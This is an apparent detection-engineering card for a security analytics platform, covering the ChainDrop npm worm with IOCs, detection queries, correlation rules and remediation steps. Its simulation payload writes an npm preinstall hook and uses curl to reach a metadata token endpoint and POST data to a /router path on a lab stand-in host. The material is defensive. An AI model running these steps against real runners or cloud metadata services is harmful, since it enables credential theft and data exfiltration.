@@ -1,0 +1,556 @@
+{
+  "id": "TTP-2026-0187",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-10-27T00:00:00+00:00",
+    "updated_at": "2026-10-27T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "actor-chaindrop",
+      "malware-chaindrop",
+      "vector-supply-chain",
+      "npm",
+      "ci-runner",
+      "unit42",
+      "stitched-chain",
+      "real-ioc-dns-lookup",
+      "bioc",
+      "abioc",
+      "ioc",
+      "correlation",
+      "severity-critical"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-PANW-TECHDOCS"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "supply-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux",
+        "aws"
+      ],
+      "estimated_runtime_seconds": 600,
+      "cleanup_required": true,
+      "safety_class": "safe-by-design"
+    }
+  },
+  "identity": {
+    "name": "ChainDrop npm Worm — CI-Runner Preinstall to Runner.Worker Scrape, IMDS Harvest, C2 Exfil and STS Reuse (T1195.002 / T1003.007 / T1552.005)",
+    "summary": "ChainDrop's npm preinstall launches setup.mjs and a detached runtime on math_init.js, scrapes Runner.Worker memory, harvests metadata, k8s and Terraform credentials, persists in .vscode/.claude and exfiltrates to /router. The card validates that endpoint, NGFW and CloudTrail signals stitch into one incident on the runner.",
+    "description": "Unit 42 (2026-08-06) analysed ChainDrop, a self-propagating npm worm in the Shai-Hulud lineage. An infected package adds a preinstall entry that runs the setup.mjs dropper; the dropper finds or fetches Bun and feeds it the obfuscated math_init.js payload, which relaunches itself detached with _NODE_RUNTIME_INIT=1 (inline inside CI). The payload uses an embedded Python helper to read /proc/<pid>/maps and /proc/<pid>/mem of the Runner.Worker process for OIDC tokens and runner secrets, queries metadata and token endpoints for temporary IAM role credentials, takes Kubernetes service-account tokens, kubeconfigs and Terraform state, persists through .vscode/tasks.json (folderOpen) and .claude/settings.json (SessionStart hook), and ships a gzip + AES-256-GCM bundle with an RSA-OAEP-wrapped key to /router on an Ethereum-contract-resolved C2 (npm-cache.com, rotated to awqhnjewqjkl.icu on Aug. 4). SIM-MP-028 reproduces the lineage with a local inert package, a decoy Runner.Worker, staged credential files and lab-only network targets (AES-256-CBC stands in for GCM, which openssl enc lacks), and pairs it with NGFW threat/traffic records carrying the published hashes, both C2 domains and the rotated domain's two IPs and a CloudTrail STS record from the runner's address. CR-MP-0028 fuses the three legs on src_host.",
+    "severity": "critical",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "ChainDrop",
+        "aliases": [
+          "Shai-Hulud lineage (unattributed)"
+        ]
+      }
+    ],
+    "campaigns": [
+      "ChainDrop self-propagating npm worm (keyv, cacheable-request, @opensearch/setup), 2026"
+    ],
+    "malware_families": [
+      {
+        "name": "ChainDrop"
+      }
+    ],
+    "industries_targeted": [
+      "technology"
+    ],
+    "first_observed": "2026-08-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1195",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ],
+        "subtechnique_id": "T1195.002"
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ],
+        "subtechnique_id": "T1059.007"
+      },
+      {
+        "technique_id": "T1003",
+        "name": "OS Credential Dumping: Proc Filesystem",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ],
+        "subtechnique_id": "T1003.007"
+      },
+      {
+        "technique_id": "T1552",
+        "name": "Unsecured Credentials: Cloud Instance Metadata API",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ],
+        "subtechnique_id": "T1552.005"
+      },
+      {
+        "technique_id": "T1528",
+        "name": "Steal Application Access Token",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1546",
+        "name": "Event Triggered Execution",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      },
+      {
+        "technique_id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts: Cloud Accounts",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ],
+        "subtechnique_id": "T1078.004"
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Creation",
+      "Process: OS API Execution",
+      "File: File Access",
+      "File: File Creation",
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Content",
+      "Cloud Service: Cloud Service Modification"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-MP-028 — ChainDrop npm worm CI-runner to cloud stitched chain",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR agent on the Linux CI runner / container host, with node, npm, python3 and openssl present.",
+        "check_command": "command -v node npm python3 openssl"
+      },
+      {
+        "description": "NGFW threat + traffic and AWS CloudTrail ingestion reach the tenant (or the operator collector) so panw_ngfw_threat_raw, panw_ngfw_traffic_raw and cloud_audit_logs are populated.",
+        "check_command": "echo \"collector=${COLLECTOR_URL:-unset}\""
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Inert ChainDrop lineage: local package, no report package installed, Bun never fetched.\nset -u\nW=/tmp/cortexsim-mp-028/pkg; mkdir -p \"$W\" /tmp/cortexsim-mp-028/run\nprintf '%s\\n' '{\"name\":\"cortexsim-mp028-inert\",\"version\":\"0.0.1\",\"private\":true,\"scripts\":{\"preinstall\":\"node setup.mjs\"}}' > \"$W/package.json\"\nprintf '%s\\n' \"import { spawn } from 'node:child_process'; spawn(process.execPath, ['math_init.js'], { detached: true, stdio: 'ignore', env: { ...process.env, _NODE_RUNTIME_INIT: '1' } }).unref();\" > \"$W/setup.mjs\"\nprintf '%s\\n' \"require('fs').writeFileSync('/tmp/cortexsim-mp-028/run/math_init.ran', String(process.pid));\" > \"$W/math_init.js\"\n(cd \"$W\" && npm install --no-audit --no-fund --offline --loglevel=error)\ncurl -s --max-time 2 -X PUT \"http://${IMDS_HOST:-${STAGE_HOST:-127.0.0.1}}/latest/api/token\" -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -o /dev/null\ncurl -s --max-time 3 -X POST --data-binary @/tmp/cortexsim-mp-028/run/math_init.ran \"http://${STAGE_HOST:-127.0.0.1}/router\" -o /dev/null",
+      "input_variables": [
+        {
+          "name": "STAGE_HOST",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "Lab-controlled host that receives the metadata-shape requests and the /router POST."
+        },
+        {
+          "name": "IMDS_HOST",
+          "type": "string",
+          "default": "",
+          "description": "Unset by default. Only when the operator sets it does the metadata read reach that host (e.g. a real metadata service in an authorised lab)."
+        }
+      ],
+      "timeout_seconds": 600
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "npm -> sh -> node setup.mjs -> detached node/bun math_init.js with _NODE_RUNTIME_INIT=1.",
+        "expected_value": "causality_actor_process_image_name in (\"npm\", \"node\") and action_process_image_command_line contains \"math_init.js\""
+      },
+      {
+        "artifact_type": "file",
+        "description": "/proc/<pid>/mem of a Runner.Worker process opened for read.",
+        "expected_value": "action_file_path ~= \"/proc/[0-9]+/mem\""
+      },
+      {
+        "artifact_type": "file",
+        "description": ".vscode/tasks.json (runOn folderOpen) and .claude/settings.json (SessionStart hook) written.",
+        "expected_value": "action_file_name in (\"tasks.json\", \"settings.json\")"
+      },
+      {
+        "artifact_type": "dns-query",
+        "description": "DNS resolution of the rotated ChainDrop C2 domain through the lab resolver.",
+        "expected_value": "dns_query_name = \"awqhnjewqjkl.icu\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "NGFW threat verdicts on the published sha256s and sessions to the published C2 domain/IPs from the runner.",
+        "expected_value": "panw_ngfw_threat_raw filedigest in the four ChainDrop sha256s"
+      },
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "sts:AssumeRole from the runner's address.",
+        "expected_value": "cloud_audit_logs eventName = \"AssumeRole\""
+      }
+    ]
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668",
+        "context": "setup.mjs dropper, first variant (Unit 42 ChainDrop IoC table).",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb",
+        "context": "setup.mjs dropper, second variant (Unit 42 ChainDrop IoC table).",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc",
+        "context": "Math_Symbol.js / math_init.js obfuscated payload (Unit 42 ChainDrop IoC table).",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "b27b82afa5f15512f3856e549fb83d873fd0049759a4b62ce64c8d7d4dc2c678",
+        "context": "setup.mjs.malicious TLSH-pivot variant (Unit 42 ChainDrop IoC table).",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "npm-cache.com",
+        "context": "ChainDrop /router exfil and C2 host (previously active).",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "awqhnjewqjkl.icu",
+        "context": "ChainDrop C2 after the Aug. 4 Ethereum-contract rotation.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "dns_lookup"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "104.21.91.101",
+        "context": "Destination IP for awqhnjewqjkl.icu (report body text, Aug. 4 rotation section); Cloudflare-shared, so read with the domain.",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "172.67.215.154",
+        "context": "Destination IP for awqhnjewqjkl.icu (report body text, Aug. 4 rotation section); Cloudflare-shared, so read with the domain.",
+        "source_url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+        "published": "2026-08-06",
+        "safe_form": "log_field"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "MP-028 npm preinstall node setup.mjs spawns detached runtime with NODE_RUNTIME_INIT",
+        "description": "npm runs a preinstall script whose node child executes setup.mjs and spawns a second JavaScript runtime (node or bun) on math_init.js with _NODE_RUNTIME_INIT=1 in its environment.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name in (\"npm\", \"npm-cli.js\", \"node\")\n| filter action_process_image_name in (\"node\", \"bun\")\n| filter action_process_image_command_line contains \"math_init.js\" or action_process_image_command_line contains \"Math_Symbol.js\" or action_process_image_command_line contains \"setup.mjs\"\n| fields agent_hostname, causality_actor_process_image_name, actor_process_image_command_line, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1195.002",
+          "T1059.007"
+        ],
+        "suppression_window_seconds": 3600
+      },
+      {
+        "name": "MP-028 proc pid mem read of Runner.Worker process",
+        "description": "A process that is not a debugger opens /proc/<pid>/maps and /proc/<pid>/mem where <pid> belongs to Runner.Worker — the CI memory scrape for OIDC tokens and masked secrets.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and action_file_path ~= \"^/proc/[0-9]+/(mem|maps)$\"\n| filter actor_process_image_name not in (\"gdb\", \"lldb\", \"strace\")\n| join type = inner (dataset = xdr_data | filter event_type = ENUM.PROCESS and action_process_image_name = \"Runner.Worker\" | alter target_pid = to_string(action_process_os_pid) | fields agent_hostname, target_pid) as rw rw.agent_hostname = agent_hostname\n| filter action_file_path in (concat(\"/proc/\", rw.target_pid, \"/mem\"), concat(\"/proc/\", rw.target_pid, \"/maps\"))\n| fields agent_hostname, actor_process_image_name, actor_process_image_command_line, action_file_path",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1003.007",
+          "T1528"
+        ],
+        "suppression_window_seconds": 3600
+      },
+      {
+        "name": "MP-028 npm lineage queries instance metadata token and IAM credentials endpoints",
+        "description": "A child process started under an npm or node causality actor carries a metadata token PUT (/latest/api/token) or an iam/security-credentials GET in its command line. Keyed on the child's command-line URI and the lineage, so it fires whether the target is the real metadata address or a lab stand-in.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name in (\"npm\", \"node\", \"bun\")\n| filter action_process_image_command_line contains \"/latest/api/token\" or action_process_image_command_line contains \"/latest/meta-data/iam/security-credentials\"\n| fields agent_hostname, causality_actor_process_image_name, actor_process_image_command_line, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1552.005"
+        ],
+        "suppression_window_seconds": 3600
+      },
+      {
+        "name": "MP-028 vscode tasks folderOpen and claude SessionStart hook persistence written",
+        "description": "A node-lineage process writes .vscode/tasks.json and .claude/settings.json whose commands launch node setup.mjs — the ChainDrop developer-tooling persistence pair.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_WRITE, ENUM.FILE_CREATE_NEW)\n| filter action_file_path contains \"/.vscode/tasks.json\" or action_file_path contains \"/.claude/settings.json\" or action_file_path contains \"/.vscode/setup.mjs\" or action_file_path contains \"/.claude/setup.mjs\"\n| comp count_distinct(action_file_path) as files by agent_hostname, causality_actor_process_image_name\n| filter files >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1546"
+        ],
+        "suppression_window_seconds": 3600
+      },
+      {
+        "name": "MP-028 encrypted bundle POST to router URI from CI lineage",
+        "description": "openssl pkeyutl with RSA-OAEP-SHA256 wraps a key, then a CI-lineage process POSTs an octet-stream body to a /router URI.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter (action_process_image_name = \"openssl\" and action_process_image_command_line contains \"rsa_padding_mode:oaep\") or (action_process_image_command_line contains \"/router\" and action_process_image_command_line contains \"--data-binary\")\n| comp count_distinct(action_process_image_name) as stages by agent_hostname, causality_actor_process_image_name\n| filter stages >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1041"
+        ],
+        "suppression_window_seconds": 3600
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "MP-028 CI runner large HTTPS upload to a rare domain",
+        "description": "NGFW EAL behavioural alert: a CI runner opens a first-seen HTTPS session and then a large outbound upload to a fleet-rare domain (awqhnjewqjkl.icu in this chain).",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter app in (\"ssl\", \"web-browsing\") and dst_hostname != null\n| comp sum(bytes_sent) as sent, count() as sessions by src, endpoint_device_name, dst_hostname\n| filter sent >= 104857600",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1041"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-host egress baseline -> first-seen destination plus outbound-volume deviation, anchored to src / endpoint_device_name."
+      },
+      {
+        "name": "MP-028 STS AssumeRole from a CI runner address after metadata harvest",
+        "description": "A caller identity calls sts:AssumeRole from a first-seen runner address (no prior STS call by that identity from that address in the history window) — a CI runner which, minutes earlier, read the metadata token endpoint.",
+        "logic": "dataset = cloud_audit_logs\n| filter eventName = \"AssumeRole\" and eventSource = \"sts.amazonaws.com\"\n| alter caller_ip = sourceIPAddress, role_arn = userIdentity.arn\n| join type = left (dataset = cloud_audit_logs | filter _time < to_timestamp(current_time() - 3600) and eventSource = \"sts.amazonaws.com\" | comp count() as prior_calls by userIdentity.arn, sourceIPAddress | alter hist_arn = userIdentity.arn, hist_ip = sourceIPAddress | fields hist_arn, hist_ip, prior_calls) as hist hist.hist_arn = role_arn and hist.hist_ip = caller_ip\n| filter prior_calls = null\n| comp count() as calls by role_arn, caller_ip",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1078.004",
+          "T1552.005"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-role caller-address baseline -> first-seen runner address, bridged to the endpoint by IP -> host asset resolution."
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "MP-028 npm preinstall lineage validation in xdr_data",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 3600)\n| filter causality_actor_process_image_name in (\"npm\", \"node\")\n| filter action_process_image_command_line contains \"setup.mjs\" or action_process_image_command_line contains \"math_init.js\"\n| comp count() as events by agent_hostname",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "MP-028 CI credential file reads under npm causality",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.FILE\n| filter action_file_path contains \"serviceaccount/token\" or action_file_path contains \".kube/config\" or action_file_path contains \"terraform.tfstate\"\n| filter causality_actor_process_image_name in (\"npm\", \"node\", \"bun\")\n| comp count_distinct(action_file_path) as cred_files by agent_hostname",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-028 ChainDrop WildFire verdicts landed in panw_ngfw_threat_raw",
+        "query": "dataset = panw_ngfw_threat_raw\n| filter filedigest in (\"54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668\", \"fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb\", \"9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc\", \"b27b82afa5f15512f3856e549fb83d873fd0049759a4b62ce64c8d7d4dc2c678\")\n| comp count_distinct(filedigest) as digests by endpoint_device_name, src\n| filter digests >= 4",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_threat_raw"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "ChainDrop npm worm — endpoint, NGFW and CloudTrail legs on one CI runner",
+        "rule_id": "CR-MP-0028",
+        "logic": "(BIOC(MP-028 npm preinstall node setup.mjs spawns detached runtime with NODE_RUNTIME_INIT) OR BIOC(MP-028 proc pid mem read of Runner.Worker process) OR BIOC(MP-028 npm lineage queries instance metadata token and IAM credentials endpoints)) AND (IOC(file-sha256 ChainDrop) OR ABIOC(MP-028 CI runner large HTTPS upload to a rare domain) OR IOC(domain awqhnjewqjkl.icu) OR IOC(domain npm-cache.com)) AND ABIOC(MP-028 STS AssumeRole from a CI runner address after metadata harvest) within 1800s on the same src_host (endpoint alerts project agent_hostname; NGFW records carry endpoint_device_name and src; CloudTrail carries sourceIPAddress, resolved to the host by XSIAM asset IP->host mapping) -> one ChainDrop supply-chain incident."
+      },
+      {
+        "name": "MP-028 network-leg fusion — NGFW threat verdict + traffic session on one host",
+        "rule_id": "CR-MP-NET-0028",
+        "logic": "panw_ngfw_threat_raw (WildFire verdict malicious, action alert; ChainDrop sha256 WildFire verdicts) JOIN panw_ngfw_traffic_raw (large HTTPS upload sessions to awqhnjewqjkl.icu / npm-cache.com) ON endpoint_device_name (with src as the tie-break when the hostname is absent) WHERE |traffic._time - threat._time| <= 1800s -> one network-plane finding for the run host; feeds CR-MP-0028 as its network leg. Joins only NGFW records; no endpoint or cloud dataset."
+      }
+    ],
+    "analytics_modules": [
+      {
+        "module": "Cortex XSIAM correlation + Unit 42 threat-intel enrichment",
+        "validated": false,
+        "note": "Authored, not tenant-verified. CR-MP-0028 joins on src_host; the CloudTrail leg relies on IP->host resolution."
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter causality_actor_process_image_name in (\"npm\", \"node\") and action_process_image_command_line contains \"math_init.js\" | comp count() by agent_hostname"
+      },
+      {
+        "module": "advanced-wildfire",
+        "coverage_tier": "detection",
+        "evidence_query": "dataset = panw_ngfw_threat_raw | filter filedigest = \"9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc\""
+      },
+      {
+        "module": "cortex-cdr",
+        "submodule": "cloud-audit-analytics",
+        "coverage_tier": "detection",
+        "evidence_query": "dataset = cloud_audit_logs | filter eventName = \"AssumeRole\" | comp count() by sourceIPAddress"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "license_required": "enterprise",
+        "evidence_query": "CR-MP-0028 raises one incident spanning EDR, NDR and CDR alerts for the runner's src_host."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-MP-028",
+        "name": "ChainDrop npm Worm — CI Runner to Cloud",
+        "description": "A poisoned npm dependency runs on a CI runner, steals runner and cloud credentials, persists in developer tooling and exfiltrates to its C2; the SOC sees one incident across endpoint, network and cloud.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-MP-028A",
+            "objective": "Endpoint lineage, NGFW indicator matches and the STS call all fire for the same runner.",
+            "preconditions": [
+              "XDR agent on the runner.",
+              "NGFW threat/traffic and CloudTrail ingested."
+            ],
+            "steps": [
+              "Run SIM-MP-028.",
+              "Wait for enrichment and correlation."
+            ],
+            "success_criteria": [
+              "The npm-lineage BIOCs fire on the runner.",
+              "WildFire verdicts and C2 sessions carry the runner's src_host.",
+              "STS AssumeRole from the runner's address raises the CDR alert."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "threat_step_id": "TS-MP-028B",
+            "objective": "CR-MP-0028 fuses the three legs into one incident and Unit 42 enrichment names ChainDrop.",
+            "preconditions": [
+              "TS-MP-028A met."
+            ],
+            "steps": [
+              "Open the incident for the runner's host."
+            ],
+            "success_criteria": [
+              "Exactly one incident contains EDR, NDR and CDR alerts.",
+              "The hashes, domains and IPs are tagged ChainDrop."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Run npm ci with --ignore-scripts in CI unless a package is allow-listed to run lifecycle scripts.",
+      "Require IMDSv2 with hop limit 1 on runner hosts and scope runner IAM roles to the job.",
+      "Use short-lived, audience-restricted OIDC tokens and do not serialise toJSON(secrets) in workflows.",
+      "Block the published ChainDrop domains at DNS Security / URL filtering; match on domain or SNI, not the shared Cloudflare IPs."
+    ],
+    "detection_engineering": [
+      "Alert on /proc/<pid>/mem reads of Runner.Worker by any non-debugger process.",
+      "Alert on writes of .vscode/tasks.json with runOn folderOpen and .claude/settings.json hooks outside developer workstations.",
+      "Correlate metadata token-endpoint reads on a runner with STS calls from that runner's address."
+    ],
+    "response_playbook": "XSOAR-PB-ChainDropNpmWormContainment-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — ChainDrop: Inside a Self-Propagating npm Worm",
+      "url": "https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK — T1195.002 Compromise Software Supply Chain",
+      "url": "https://attack.mitre.org/techniques/T1195/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK — T1552.005 Cloud Instance Metadata API",
+      "url": "https://attack.mitre.org/techniques/T1552/005/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Cortex XSIAM — Analytics Alert Reference",
+      "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Analytics-Alert-Reference",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    }
+  ]
+}
